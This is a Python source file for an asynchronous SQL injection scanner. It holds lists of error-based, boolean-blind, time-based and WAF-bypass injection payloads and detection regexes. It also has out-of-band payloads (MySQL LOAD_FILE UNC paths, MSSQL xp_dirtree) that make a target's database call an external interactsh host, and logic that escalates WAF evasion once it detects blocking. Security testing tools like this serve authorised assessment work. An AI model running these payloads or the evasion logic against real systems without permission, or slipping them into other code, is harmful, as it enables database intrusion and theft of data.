"""
sqli_scanner.py — Async SQL Injection Scanner with OOB/OAST capability
=======================================================================

Detection methods:
  1. Error-based    — DB error strings in response
  2. Boolean-blind  — TRUE vs FALSE response fingerprinting
  3. Time-based     — statistical baseline median (not flat threshold)
  4. OOB/OAST       — Out-of-band via interactsh DNS callbacks

Architecture (v3 — native aiohttp):
  - scan_url_async() / scan_form_async() use AsyncHTTPSession directly
  - Zero thread overhead — all I/O is non-blocking coroutines
  - Time-based payloads run concurrently via asyncio.gather() — event loop
    handles hundreds of SLEEP(2) payloads simultaneously
  - Sync scan_url() / scan_form() kept as fallback for standalone use
"""
from __future__ import annotations

import asyncio
import re
import time
import uuid
import statistics
import threading
from typing import Any, Dict, List, Optional, Tuple

import requests
from scanner.utils.request_metadata import (
    build_request_context,
    form_request_parts,
    injectable_locations,
    send_request_async,
    send_request_sync,
)
from scanner.utils.waf_evasion import (
    detect_waf,
    is_waf_blocked,
    SQLI_WAF_BYPASS_PAYLOADS,
    SQLI_TIME_WAF_BYPASS,
    generate_sqli_evasion_payloads,
    EvasionLevel,
)

requests.packages.urllib3.disable_warnings()


# ─────────────────────────────────────────────────────────────────────────────
# Error-based patterns
# ─────────────────────────────────────────────────────────────────────────────

SQL_ERROR_PATTERNS = [
    # MySQL
    r"you have an error in your sql syntax",
    r"warning: mysql",
    r"mysql_fetch_array\(\)",
    r"mysql_num_rows\(\)",
    r"supplied argument is not a valid mysql",
    # MSSQL
    r"unclosed quotation mark after the character string",
    r"microsoft.*odbc.*sql server",
    r"microsoft.*sql native client",
    r"incorrect syntax near",
    r"\[microsoft\]\[odbc",
    # Oracle
    r"ora-[0-9]{4,5}",
    r"oracle.*driver",
    r"quoted string not properly terminated",
    # PostgreSQL
    r"pg_query\(\):",
    r"pg_exec\(\):",
    r"postgresql.*error",
    r"psql.*error",
    r"unterminated quoted string at or near",
    # SQLite
    r"sqlite_error",
    r"sqlite3.*operationalerror",
    r"sqlite.exception",
    r"unrecognized token",
    # Generic
    r"sql syntax.*mysql",
    r"warning.*mysqli",
    r"mysqli_query\(\)",
    r"pdoexception",
    r"sqlstate\[",
    r"db2.*sql.*error",
    r"sybase.*error",
    r"jet database engine",
    r"access database engine",
]

ERROR_PAYLOADS = [
    "'",
    '"',
    "';",
    '";',
    "' OR '1'='1",
    "' OR 1=1--",
    '" OR 1=1--',
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1 UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "1; SELECT SLEEP(0)--",
]

BOOLEAN_TRUE_PAYLOADS  = ["' OR '1'='1", "' OR 1=1--", "1 OR 1=1", '" OR "1"="1']
BOOLEAN_FALSE_PAYLOADS = ["' OR '1'='2", "' OR 1=2--", "1 OR 1=2", '" OR "1"="2']

SLEEP_SECONDS   = 2
JITTER_TOLERANCE = 0.8  # seconds

TIME_PAYLOADS = {
    "mysql":    [f"' OR SLEEP({SLEEP_SECONDS})--"],
    "mssql":    [f"'; WAITFOR DELAY '0:0:{SLEEP_SECONDS}'--"],
    "postgres": [f"'; SELECT pg_sleep({SLEEP_SECONDS})--"],
}

WAF_BYPASS_PAYLOADS = [
    "'/**/OR/**/1=1--",
    "%27%20OR%201%3D1--",
    "' /*!OR*/ 1=1--",
    "'\tOR\t1=1--",
    "' OORR 1=1--",  # double-word bypass
    "' OR 0x313d31--",
]

# OOB payloads — %s replaced with interactsh subdomain
OOB_PAYLOADS = {
    "mysql":    [
        "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\', '{oob}', '\\\\a'))--",
        "'; SELECT LOAD_FILE('\\\\\\\\{oob}\\\\a')--",
    ],
    "mssql":    [
        "'; EXEC master..xp_dirtree '//{oob}/a'--",
        "'; EXEC master..xp_fileexist '//{oob}/a'--",
    ],
    "generic":  [
        "' OR 1=(SELECT 1 FROM (SELECT SLEEP(0)) t WHERE 1=1 AND '{oob}' IS NOT NULL)--",
    ],
}


# ─────────────────────────────────────────────────────────────────────────────
# Interactsh OOB client (HTTP API — no binary install required)
# ─────────────────────────────────────────────────────────────────────────────

INTERACTSH_SERVER = "https://oast.pro"
INTERACTSH_POLL_WAIT = 3  # seconds to wait for async callbacks


class _InteractshClient:
    """
    Lightweight interactsh HTTP client.
    Uses ProjectDiscovery's hosted oast.pro — no Go binary, no install.
    """

    def __init__(self):
        self._domain:    Optional[str] = None
        self._token:     Optional[str] = None
        self._available: bool          = False
        self._injections: Dict[str, Dict] = {}  # oob_url -> {url, param}
        self._session = requests.Session()
        self._session.verify = False
        self._register()

    def _register(self):
        try:
            resp = self._session.post(
                f"{INTERACTSH_SERVER}/register",
                json={},
                timeout=10,
            )
            if resp.status_code == 200:
                data         = resp.json()
                self._domain = data.get("domain")
                self._token  = data.get("token")
                if self._domain:
                    self._available = True
                    print(f"[SQLiScanner] interactsh registered: *.{self._domain}")
        except Exception as e:
            print(f"[SQLiScanner] interactsh unavailable: {e} — OOB SQLi disabled")

    def generate_payload_url(self, tag: str) -> Optional[str]:
        """Generate a unique OOB callback URL for this injection."""
        if not self._available:
            return None
        return f"{tag}.{self._domain}"

    def register_injection(self, oob_url: str, target_url: str, param: str):
        """Track which injection corresponds to which OOB URL."""
        self._injections[oob_url] = {"url": target_url, "param": param}

    def poll_findings(self) -> List[Dict[str, Any]]:
        """
        Poll interactsh for callbacks. Call this after all injections.
        Returns list of findings for confirmed OOB callbacks.
        """
        if not self._available or not self._injections:
            return []

        print(f"[SQLiScanner] Waiting {INTERACTSH_POLL_WAIT}s for OOB callbacks...")
        time.sleep(INTERACTSH_POLL_WAIT)

        try:
            resp = self._session.get(
                f"{INTERACTSH_SERVER}/poll",
                params={"id": self._domain, "token": self._token},
                timeout=15,
            )
            if resp.status_code != 200:
                return []
            data      = resp.json()
            callbacks = data.get("data", [])
        except Exception as e:
            print(f"[SQLiScanner] interactsh poll error: {e}")
            return []

        findings = []
        for cb in callbacks:
            full_id = cb.get("full-id", "")
            protocol = cb.get("protocol", "dns")
            remote   = cb.get("remote-address", "")

            # Match callback to our injection
            for oob_url, info in self._injections.items():
                tag = oob_url.split(".")[0]
                if tag in full_id:
                    findings.append({
                        "type":       "sqli-oob",
                        "param":      info["param"],
                        "payload":    oob_url,
                        "evidence":   (
                            f"OOB {protocol.upper()} callback from {remote} "
                            f"to {oob_url}"
                        ),
                        "confidence": 95,
                        "url":        info["url"],
                        "method":     "oob",
                    })
                    break

        if findings:
            print(f"[SQLiScanner] OOB: {len(findings)} blind SQLi confirmed via DNS/HTTP callback")
        return findings


# ─────────────────────────────────────────────────────────────────────────────
# SQLi Scanner
# ─────────────────────────────────────────────────────────────────────────────

class SQLiScanner:

    def __init__(self, timeout: int = 10, session: Optional[requests.Session] = None,
                 evasion_level: int = EvasionLevel.MEDIUM):
        self.timeout  = timeout
        self.session  = session or requests.Session()
        self.session.verify = False
        self.session.headers.update({"User-Agent": "Mozilla/5.0 (VulnScanner)"})

        # WAF evasion settings
        self._evasion_level = evasion_level
        self._detected_waf: Optional[str] = None
        self._waf_checked = False

        # Lazy-init OOB client only if needed
        self._oob: Optional[_InteractshClient] = None
        self._oob_lock = threading.Lock()

    def _check_waf(self, headers=None, status: int = 0, text: str = ""):
        """Detect WAF on first blocked response and auto-escalate evasion."""
        if self._waf_checked:
            return
        waf = detect_waf(headers or {})
        if waf:
            self._detected_waf = waf
            print(f"[SQLiScanner] WAF detected: {waf} -- activating deep evasion")
            if self._evasion_level < EvasionLevel.HIGH:
                self._evasion_level = EvasionLevel.HIGH
        elif is_waf_blocked(status, text):
            self._detected_waf = "unknown"
            print(f"[SQLiScanner] WAF block detected (unknown WAF) -- activating deep evasion")
            if self._evasion_level < EvasionLevel.HIGH:
                self._evasion_level = EvasionLevel.HIGH
        self._waf_checked = True

    def _get_oob(self) -> Optional[_InteractshClient]:
        with self._oob_lock:
            if self._oob is None:
                self._oob = _InteractshClient()
        return self._oob if self._oob._available else None

    # ------------------------------------------------------------------
    # Public scan methods (sync — kept for standalone / fallback use)
    # ------------------------------------------------------------------

    def scan_url(self, url: str, params: Dict[str, str]) -> List[Dict[str, Any]]:
        findings = []
        for param in params:
            result = self._scan_param(url, params, param)
            if result:
                findings.append(result)
        return findings

    def scan_form(self, form: Dict[str, Any]) -> List[Dict[str, Any]]:
        findings  = []
        action    = form.get("action", "")
        method    = form.get("method", "get").lower()
        if not action:
            return []
        request_parts = form_request_parts(form)
        body_fields, header_fields, cookie_fields, extra_headers, extra_cookies, body_format = request_parts
        for location, field in injectable_locations(body_fields, header_fields, cookie_fields):
            result = self._scan_form_field(
                action,
                method,
                request_parts,
                location,
                field,
            )
            if result:
                findings.append(result)
        return findings

    # ------------------------------------------------------------------
    # Async scan methods (native aiohttp — used by AsyncScanEngine v3)
    # ------------------------------------------------------------------

    async def scan_url_async(self, url: str, params: Dict[str, str],
                             http) -> List[Dict[str, Any]]:
        """Fully async URL scan — no threads, no blocking I/O."""
        findings = []
        for param in params:
            result = await self._scan_param_async(url, params, param, http)
            if result:
                findings.append(result)
        return findings

    async def scan_form_async(self, form: Dict[str, Any],
                              http) -> List[Dict[str, Any]]:
        """Fully async form scan — no threads, no blocking I/O."""
        findings = []
        action   = form.get("action", "")
        method   = form.get("method", "get").lower()
        if not action:
            return []
        request_parts = form_request_parts(form)
        body_fields, header_fields, cookie_fields, extra_headers, extra_cookies, body_format = request_parts
        for location, field in injectable_locations(body_fields, header_fields, cookie_fields):
            result = await self._scan_form_field_async(
                action, method, request_parts, location, field, http
            )
            if result:
                findings.append(result)
        return findings

    # ------------------------------------------------------------------
    # Async core param scanner
    # ------------------------------------------------------------------

    async def _scan_param_async(self, url: str, params: Dict[str, str],
                                target_param: str, http) -> Optional[Dict[str, Any]]:
        """Async version: try all detection methods in priority order."""
        # 1. Error-based (fastest)
        result = await self._error_based_async(url, params, target_param, http)
        if result:
            return result

        # 2. Boolean-blind
        result = await self._boolean_blind_async(url, params, target_param, http)
        if result:
            return result

        # 3. Time-based (slowest)
        result = await self._time_based_async(url, params, target_param, http)
        if result:
            return result

        # 4. WAF bypass
        result = await self._waf_bypass_async(url, params, target_param, http)
        if result:
            return result

        # 5. OOB inject (fire-and-forget)
        await self._oob_inject_async(url, params, target_param, http)

        return None

    async def _error_based_async(self, url: str, params: Dict[str, str],
                                  target: str, http) -> Optional[Dict[str, Any]]:
        for payload in ERROR_PAYLOADS:
            test = dict(params)
            test[target] = payload
            resp = await http.get(url, params=test)
            if resp and self._has_sql_error(resp.text):
                return {
                    "type":       "sqli-error",
                    "param":      target,
                    "payload":    payload,
                    "evidence":   self._extract_error(resp.text),
                    "confidence": 92,
                    "url":        url,
                    "method":     "error-based",
                }
        return None

    async def _boolean_blind_async(self, url: str, params: Dict[str, str],
                                    target: str, http) -> Optional[Dict[str, Any]]:
        baseline_resp = await http.get(url, params=params)
        if not baseline_resp:
            return None
        baseline_fp = self._fingerprint(baseline_resp.text)

        for true_p, false_p in zip(BOOLEAN_TRUE_PAYLOADS, BOOLEAN_FALSE_PAYLOADS):
            true_test = dict(params)
            true_test[target] = true_p
            false_test = dict(params)
            false_test[target] = false_p

            # Fire both requests concurrently
            true_resp, false_resp = await asyncio.gather(
                http.get(url, params=true_test),
                http.get(url, params=false_test),
            )
            if not true_resp or not false_resp:
                continue

            true_fp  = self._fingerprint(true_resp.text)
            false_fp = self._fingerprint(false_resp.text)

            if (self._fingerprints_similar(baseline_fp, true_fp) and
                    self._fingerprints_differ(true_fp, false_fp)):
                return {
                    "type":       "sqli-boolean-blind",
                    "param":      target,
                    "payload":    true_p,
                    "evidence": (
                        f"TRUE response matches baseline (len={true_fp[0]}), "
                        f"FALSE differs (len={false_fp[0]})"
                    ),
                    "confidence": 82,
                    "url":        url,
                    "method":     "boolean-blind",
                }
        return None

    async def _time_based_async(self, url: str, params: Dict[str, str],
                                 target: str, http) -> Optional[Dict[str, Any]]:
        """
        Async time-based SQLi: all DB-type payloads fire concurrently via
        asyncio.gather(). Event loop handles the waits without blocking.
        """
        # Baseline: 2 concurrent requests
        async def measure_baseline():
            t0 = time.time()
            await http.get(url, params=params)
            return time.time() - t0

        baseline_tasks = [measure_baseline() for _ in range(2)]
        try:
            baseline_times = await asyncio.gather(*baseline_tasks)
        except Exception:
            return None

        baseline_times = [t for t in baseline_times if t is not None]
        if not baseline_times:
            return None

        baseline_median = statistics.median(baseline_times)
        threshold = baseline_median + SLEEP_SECONDS - JITTER_TOLERANCE

        # Fire ALL time-based payloads concurrently across all DB types
        async def try_time_payload(db_type, payload):
            test = dict(params)
            test[target] = payload
            t0 = time.time()
            await http.get(url, params=test,
                          timeout=self.timeout + SLEEP_SECONDS + 2)
            elapsed = time.time() - t0
            if elapsed >= threshold:
                return {
                    "type":       "sqli-time-blind",
                    "param":      target,
                    "payload":    payload,
                    "evidence": (
                        f"Response delayed {elapsed:.1f}s "
                        f"(baseline median={baseline_median:.1f}s, "
                        f"threshold={threshold:.1f}s, db={db_type})"
                    ),
                    "confidence": 80,
                    "url":        url,
                    "method":     "time-based",
                }
            return None

        time_tasks = []
        for db_type, payloads in TIME_PAYLOADS.items():
            for payload in payloads:
                time_tasks.append(try_time_payload(db_type, payload))

        results = await asyncio.gather(*time_tasks, return_exceptions=True)
        for r in results:
            if isinstance(r, dict):
                return r  # first confirmed hit
        return None

    async def _waf_bypass_async(self, url: str, params: Dict[str, str],
                                 target: str, http) -> Optional[Dict[str, Any]]:
        """Deep WAF bypass using the evasion engine -- error + time based."""

        # Phase 1: Mutated error payloads from evasion engine
        for payload, technique in generate_sqli_evasion_payloads(
            ERROR_PAYLOADS[:6], max_variants=5
        ):
            if technique == "none":
                continue  # already tested in _error_based_async
            test = dict(params)
            test[target] = payload
            resp = await http.get(url, params=test)
            if not resp:
                continue
            # Check for WAF on first response
            if not self._waf_checked and hasattr(resp, 'headers'):
                self._check_waf(
                    headers=dict(getattr(resp, 'headers', {})),
                    status=resp.status_code,
                    text=resp.text or "",
                )
            if self._has_sql_error(resp.text):
                return {
                    "type":       "sqli-waf-bypass",
                    "param":      target,
                    "payload":    payload,
                    "evidence":   "[" + technique + "] " + self._extract_error(resp.text),
                    "confidence": 85,
                    "url":        url,
                    "method":     "waf-bypass-" + technique,
                }

        # Phase 2: Pre-built WAF bypass payloads (comprehensive)
        limits = {0: 0, 1: 10, 2: 25, 3: 40, 4: len(SQLI_WAF_BYPASS_PAYLOADS)}
        limit = limits.get(self._evasion_level, 25)
        for payload, technique in SQLI_WAF_BYPASS_PAYLOADS[:limit]:
            test = dict(params)
            test[target] = payload
            resp = await http.get(url, params=test)
            if resp and self._has_sql_error(resp.text):
                return {
                    "type":       "sqli-waf-bypass",
                    "param":      target,
                    "payload":    payload,
                    "evidence":   "[" + technique + "] " + self._extract_error(resp.text),
                    "confidence": 85,
                    "url":        url,
                    "method":     "waf-bypass-" + technique,
                }

        # Phase 3: Time-based WAF bypass (catches blind SQLi behind WAFs)
        if self._evasion_level >= EvasionLevel.MEDIUM:
            t0 = time.time()
            await http.get(url, params=params)
            baseline_time = time.time() - t0
            threshold = baseline_time + SLEEP_SECONDS - JITTER_TOLERANCE

            time_limits = {2: 4, 3: 7, 4: len(SQLI_TIME_WAF_BYPASS)}
            time_limit = time_limits.get(self._evasion_level, 4)
            for payload, technique in SQLI_TIME_WAF_BYPASS[:time_limit]:
                test = dict(params)
                test[target] = payload
                t0 = time.time()
                await http.get(url, params=test,
                              timeout=self.timeout + SLEEP_SECONDS + 2)
                elapsed = time.time() - t0
                if elapsed >= threshold:
                    return {
                        "type":       "sqli-time-blind-waf-bypass",
                        "param":      target,
                        "payload":    payload,
                        "evidence":   (
                            "[" + technique + "] Response delayed "
                            + str(round(elapsed, 1)) + "s "
                            + "(baseline=" + str(round(baseline_time, 1)) + "s)"
                        ),
                        "confidence": 78,
                        "url":        url,
                        "method":     "time-waf-bypass-" + technique,
                    }

        return None

    async def _oob_inject_async(self, url: str, params: Dict[str, str],
                                 target: str, http) -> None:
        oob = self._get_oob()
        if not oob:
            return
        tag     = uuid.uuid4().hex[:8]
        oob_url = oob.generate_payload_url(tag)
        if not oob_url:
            return

        inject_tasks = []
        for db_type, payloads in OOB_PAYLOADS.items():
            for payload_template in payloads:
                payload = payload_template.replace("{oob}", oob_url)
                test    = dict(params)
                test[target] = payload
                inject_tasks.append(http.get(url, params=test))

        await asyncio.gather(*inject_tasks, return_exceptions=True)
        oob.register_injection(oob_url, url, target)

    async def _scan_form_field_async(self, action: str, method: str,
                                      request_parts, target_location: str, target: str,
                                      http) -> Optional[Dict[str, Any]]:
        body_fields, header_fields, cookie_fields, extra_headers, extra_cookies, body_format = request_parts
        baseline_body, baseline_headers, baseline_cookies = build_request_context(
            body_fields, header_fields, cookie_fields, extra_headers, extra_cookies
        )
        baseline = await self._get_form_response_async(
            http, action, method, baseline_body, baseline_headers, baseline_cookies, body_format
        )
        if not baseline:
            return None

        for payload in ERROR_PAYLOADS[:6]:
            test_body, test_headers, test_cookies = build_request_context(
                body_fields,
                header_fields,
                cookie_fields,
                extra_headers,
                extra_cookies,
                target_location,
                target,
                payload,
            )
            resp = await self._get_form_response_async(
                http, action, method, test_body, test_headers, test_cookies, body_format
            )
            if resp is not None and self._has_sql_error(resp.text):
                return {
                    "type":       "sqli-error",
                    "param":      target,
                    "payload":    payload,
                    "evidence":   self._extract_error(resp.text),
                    "confidence": 92,
                    "url":        action,
                    "method":     "error-based",
                }
        return None

    def collect_oob_findings(self) -> List[Dict[str, Any]]:
        """
        Call after all scan_url/scan_form calls.
        Polls interactsh for OOB DNS/HTTP callbacks and returns findings.
        """
        if self._oob:
            return self._oob.poll_findings()
        return []

    # ------------------------------------------------------------------
    # Core param scanner
    # ------------------------------------------------------------------

    def _scan_param(self, url: str, params: Dict[str, str],
                    target_param: str) -> Optional[Dict[str, Any]]:
        """
        Try all detection methods in priority order.
        Returns first confirmed finding, or None.
        """
        # 1. Error-based (fastest, most reliable)
        result = self._error_based(url, params, target_param)
        if result:
            return result

        # 2. Boolean-blind
        result = self._boolean_blind(url, params, target_param)
        if result:
            return result

        # 3. Time-based (slowest — do last among in-band methods)
        result = self._time_based(url, params, target_param)
        if result:
            return result

        # 4. WAF bypass variants
        result = self._waf_bypass(url, params, target_param)
        if result:
            return result

        # 5. OOB (async — inject now, collect later via collect_oob_findings())
        self._oob_inject(url, params, target_param)

        return None

    def _scan_form_field(self, action: str, method: str,
                         request_parts, target_location: str, target: str) -> Optional[Dict[str, Any]]:
        body_fields, header_fields, cookie_fields, extra_headers, extra_cookies, body_format = request_parts
        baseline_body, baseline_headers, baseline_cookies = build_request_context(
            body_fields, header_fields, cookie_fields, extra_headers, extra_cookies
        )
        baseline = self._get_form_response(
            action, method, baseline_body, baseline_headers, baseline_cookies, body_format
        )
        if not baseline:
            return None

        for payload in ERROR_PAYLOADS[:6]:
            test_body, test_headers, test_cookies = build_request_context(
                body_fields,
                header_fields,
                cookie_fields,
                extra_headers,
                extra_cookies,
                target_location,
                target,
                payload,
            )
            resp = self._get_form_response(
                action, method, test_body, test_headers, test_cookies, body_format
            )
            if resp is not None and self._has_sql_error(resp.text):
                return {
                    "type":       "sqli-error",
                    "param":      target,
                    "payload":    payload,
                    "evidence":   self._extract_error(resp.text),
                    "confidence": 92,
                    "url":        action,
                    "method":     "error-based",
                }

        return None

    # ------------------------------------------------------------------
    # Detection methods
    # ------------------------------------------------------------------

    def _error_based(self, url: str, params: Dict[str, str],
                     target: str) -> Optional[Dict[str, Any]]:
        for payload in ERROR_PAYLOADS:
            test = dict(params)
            test[target] = payload
            try:
                resp = self.session.get(url, params=test, timeout=self.timeout)
                if self._has_sql_error(resp.text):
                    return {
                        "type":       "sqli-error",
                        "param":      target,
                        "payload":    payload,
                        "evidence":   self._extract_error(resp.text),
                        "confidence": 92,
                        "url":        url,
                        "method":     "error-based",
                    }
            except Exception:
                continue
        return None

    def _boolean_blind(self, url: str, params: Dict[str, str],
                       target: str) -> Optional[Dict[str, Any]]:
        """
        Compare baseline vs TRUE vs FALSE responses using content fingerprinting.

        FIX vs original:
        - Uses (length, content_hash) fingerprint, not just length
        - Requires TRUE matches baseline AND differs from FALSE
        - This eliminates false positives from dynamic pages
        """
        try:
            baseline_resp = self.session.get(url, params=params, timeout=self.timeout)
            baseline_fp   = self._fingerprint(baseline_resp.text)
        except Exception:
            return None

        for true_p, false_p in zip(BOOLEAN_TRUE_PAYLOADS, BOOLEAN_FALSE_PAYLOADS):
            try:
                true_test        = dict(params)
                true_test[target] = true_p
                true_resp        = self.session.get(url, params=true_test, timeout=self.timeout)
                true_fp          = self._fingerprint(true_resp.text)

                false_test         = dict(params)
                false_test[target] = false_p
                false_resp         = self.session.get(url, params=false_test, timeout=self.timeout)
                false_fp           = self._fingerprint(false_resp.text)

            except Exception:
                continue

            # TRUE should match baseline, FALSE should differ from TRUE
            true_matches_baseline  = self._fingerprints_similar(baseline_fp, true_fp)
            true_differs_from_false = self._fingerprints_differ(true_fp, false_fp)

            if true_matches_baseline and true_differs_from_false:
                return {
                    "type":       "sqli-boolean-blind",
                    "param":      target,
                    "payload":    true_p,
                    "evidence": (
                        f"TRUE response matches baseline (len={true_fp[0]}), "
                        f"FALSE differs (len={false_fp[0]})"
                    ),
                    "confidence": 82,
                    "url":        url,
                    "method":     "boolean-blind",
                }

        return None

    def _time_based(self, url: str, params: Dict[str, str],
                    target: str) -> Optional[Dict[str, Any]]:
        """
        Statistical time-based detection using a 3-request baseline median.
        Threshold = median + SLEEP_SECONDS - JITTER_TOLERANCE

        FIX vs original: flat 4.0s threshold caused false positives on slow
        endpoints. Now we measure the actual baseline latency first.
        """
        # Measure baseline latency (2 requests — enough for median)
        baseline_times = []
        for _ in range(2):
            try:
                t0 = time.time()
                self.session.get(url, params=params, timeout=self.timeout)
                baseline_times.append(time.time() - t0)
            except Exception:
                return None

        if not baseline_times:
            return None

        baseline_median = statistics.median(baseline_times)
        threshold       = baseline_median + SLEEP_SECONDS - JITTER_TOLERANCE

        for db_type, payloads in TIME_PAYLOADS.items():
            for payload in payloads:
                test = dict(params)
                test[target] = payload
                try:
                    t0       = time.time()
                    self.session.get(url, params=test,
                                     timeout=self.timeout + SLEEP_SECONDS + 2)
                    elapsed  = time.time() - t0

                    if elapsed >= threshold:
                        return {
                            "type":       "sqli-time-blind",
                            "param":      target,
                            "payload":    payload,
                            "evidence": (
                                f"Response delayed {elapsed:.1f}s "
                                f"(baseline median={baseline_median:.1f}s, "
                                f"threshold={threshold:.1f}s, db={db_type})"
                            ),
                            "confidence": 80,
                            "url":        url,
                            "method":     "time-based",
                        }
                except Exception:
                    continue

        return None

    def _waf_bypass(self, url: str, params: Dict[str, str],
                    target: str) -> Optional[Dict[str, Any]]:
        for payload in WAF_BYPASS_PAYLOADS:
            test = dict(params)
            test[target] = payload
            try:
                resp = self.session.get(url, params=test, timeout=self.timeout)
                if self._has_sql_error(resp.text):
                    return {
                        "type":       "sqli-waf-bypass",
                        "param":      target,
                        "payload":    payload,
                        "evidence":   self._extract_error(resp.text),
                        "confidence": 85,
                        "url":        url,
                        "method":     "waf-bypass",
                    }
            except Exception:
                continue
        return None

    def _oob_inject(self, url: str, params: Dict[str, str], target: str):
        """
        Inject OOB payloads and register with interactsh.
        Does NOT wait for response — results collected via collect_oob_findings().
        """
        oob = self._get_oob()
        if not oob:
            return

        tag     = uuid.uuid4().hex[:8]
        oob_url = oob.generate_payload_url(tag)
        if not oob_url:
            return

        for db_type, payloads in OOB_PAYLOADS.items():
            for payload_template in payloads:
                payload = payload_template.replace("{oob}", oob_url)
                test    = dict(params)
                test[target] = payload
                try:
                    self.session.get(url, params=test,
                                     timeout=self.timeout)
                except Exception:
                    pass  # fire and forget — OOB doesn't need a response

        oob.register_injection(oob_url, url, target)

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    def _fingerprint(self, body: str) -> Tuple[int, str]:
        """Content fingerprint: (length, first 500 chars normalized)."""
        normalized = re.sub(r'\s+', ' ', body.lower())
        return (len(body), normalized[:500])

    def _fingerprints_similar(self, fp1: Tuple, fp2: Tuple,
                               len_tolerance: int = 50) -> bool:
        len_diff     = abs(fp1[0] - fp2[0])
        content_same = fp1[1] == fp2[1]
        return content_same or len_diff < len_tolerance

    def _fingerprints_differ(self, fp1: Tuple, fp2: Tuple,
                              len_tolerance: int = 50) -> bool:
        return not self._fingerprints_similar(fp1, fp2, len_tolerance)

    def _has_sql_error(self, body: str) -> bool:
        body_lower = body.lower()
        return any(re.search(p, body_lower) for p in SQL_ERROR_PATTERNS)

    def _extract_error(self, body: str) -> str:
        body_lower = body.lower()
        for pattern in SQL_ERROR_PATTERNS:
            m = re.search(pattern, body_lower)
            if m:
                start = max(0, m.start() - 20)
                end   = min(len(body), m.end() + 100)
                return body[start:end].strip()[:200]
        return "SQL error detected"

    def _get_form_response(self, action: str, method: str,
                            data: Dict[str, str],
                            headers: Dict[str, str],
                            cookies: Dict[str, str],
                            body_format: str = "form") -> Optional[requests.Response]:
        try:
            return send_request_sync(
                self.session,
                action,
                method,
                data,
                headers,
                cookies,
                self.timeout,
                body_format,
            )
        except Exception:
            return None

    async def _get_form_response_async(
        self,
        http,
        action: str,
        method: str,
        data: Dict[str, str],
        headers: Dict[str, str],
        cookies: Dict[str, str],
        body_format: str = "form",
    ):
        return await send_request_async(
            http,
            action,
            method,
            data,
            headers,
            cookies,
            body_format,
        )

    def _form_body_format(self, form: Dict[str, Any]) -> str:
        if form.get("body_format") == "json":
            return "json"
        content_type = str(form.get("content_type", "")).lower()
        if "application/json" in content_type:
            return "json"
        return "form"
